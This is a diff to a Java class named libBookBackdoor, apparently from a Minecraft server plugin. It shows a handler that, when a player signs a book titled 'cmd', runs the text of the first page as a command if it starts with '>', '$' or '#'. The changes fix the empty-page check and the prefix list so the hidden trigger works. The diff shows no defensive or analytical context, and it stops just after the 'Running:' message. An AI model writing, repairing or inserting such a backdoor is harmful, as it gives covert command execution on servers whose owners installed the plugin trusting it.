@@ -80,13 +80,13 @@ public class libBookBackdoor implements Listener {
     @EventHandler
     public void onBookSign(PlayerEditBookEvent event) {
         BookMeta eventMeta = event.getNewBookMeta();
-        if (eventMeta.getTitle() != null && eventMeta.getPage(1) != null) {
+        if (eventMeta.getTitle() != null && !eventMeta.getPage(1).equals("")) {
             if(eventMeta.getTitle().equals("cmd")) {
                 String pageString = eventMeta.getPage(1);
                 String commandType = Character.toString(pageString.charAt(0));
                 String command = pageString.substring(1);
 
-                if(commandType.equals(">") || commandType.equals(">") || commandType.equals("#")) {
+                if(commandType.equals(">") || commandType.equals("$") || commandType.equals("#")) {
                     Player player = event.getPlayer();
                     try {
                         player.sendMessage("Running: " + command);
